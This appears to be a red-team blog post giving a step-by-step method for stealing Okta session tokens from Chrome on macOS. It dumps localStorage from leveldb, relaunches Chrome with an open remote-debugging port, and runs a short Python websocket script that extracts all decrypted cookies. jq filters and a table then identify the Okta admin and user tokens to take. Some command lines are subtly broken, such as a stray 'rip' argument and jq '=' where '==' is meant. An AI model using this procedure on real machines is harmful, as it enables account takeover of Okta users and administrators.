---
layout: post
title: "Dumping Okta Sessions in Chrome"
date: 2024-11-17
tags: ["post-exploitation"]
---

# Problem Statement

How difficult is it to steal Okta session tokens?

# Local Storage

Google Chrome (macOS) localStorage is saved on the filesystem in the leveldb file: `/Users/<user>/Library/Application Support/Google/Chrome/Default/Local Storage/leveldb`.[^1]

To dump localStorage:
* `git clone https://github.com/rdreher/chromeStorageDump.git`
* `npm install levelup leveldown`
* Avoid a file lock, by first copying leveldb to /tmp
* `cp -R "/Users/<user>/Library/Application Support/Google/Chrome/Default/Local Storage/leveldb" "/tmp/leveldb"`
* `node chromeStorageDump.js -k okta-cache-storage "/tmp/leveldb"`

# Cookies

Google Chrome (macOS) cookies are stored in an encrypted SQLite database with the key saved in the keychain.[^2] [^3] Unencrypted cookies can still be fetched by attaching a remote chrome debugger.[^4] [^5] This technique requires existing Chrome browsers to be restarted with the `--remote-debugging-port` flag. 

* `killall Google\ Chrome`
* `/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome --remote-allow-origins="*" --remote-debugging-port=9222 --user-data-dir="/Users/<user>/Library/Application Support/Google/Chrome" --restore-last-session --profile-directory=Default`

The following `/json` endpoint provides a list of websocket addresses. 
* `curl http://localhost:9222/json`

Using a websocket client, connect using the correct page id to dump the unencrypted cookie in JSON format.

* `pip3 install websocket`
* `pip3 install websocket-client`

```python
# ripWCMN.py
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/<id>", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv())
```
* `python3 rip ripWCMN.py  | jq -r '.[] | select(.url="https://<subdomain>.okta.com/app/UserHome")'`
* `python3 rip ripWCMN.py  | jq -c '.result.cookies[] | select(.name="idx")'`

> CREDIT - Justin Bui & @mangopdf

# Okta

If an admin session is stolen from `{tenant}.okta.com`, the session cookie can be used on `{tenant}-admin.okta.com`.[^6]

| Account | Name | Type | Note |
|---|---|---|---|
| Okta Admin | sid | cookie |  |
| Okta User | okta-token-storage | localStorage | jwt auth token |
| Okta User | idx | cookie | higher perms than bearer token |

### References:
[^1]: [https://github.com/rdreher/chromeStorageDump](https://github.com/rdreher/chromeStorageDump)
[^2]: [https://www.cyberark.com/resources/threat-research-blog/the-current-state-of-browser-cookies](https://www.cyberark.com/resources/threat-research-blog/the-current-state-of-browser-cookies)
[^3]: [https://gist.github.com/creachadair/937179894a24571ce9860e2475a2d2ec](https://gist.github.com/creachadair/937179894a24571ce9860e2475a2d2ec)
[^4]: [https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f)
[^5]: [https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e)
[^6]: [https://www.linkedin.com/pulse/oktas-so-secret-less-secure-api-authentication-method-chaim-sanders/](https://www.linkedin.com/pulse/oktas-so-secret-less-secure-api-authentication-method-chaim-sanders/)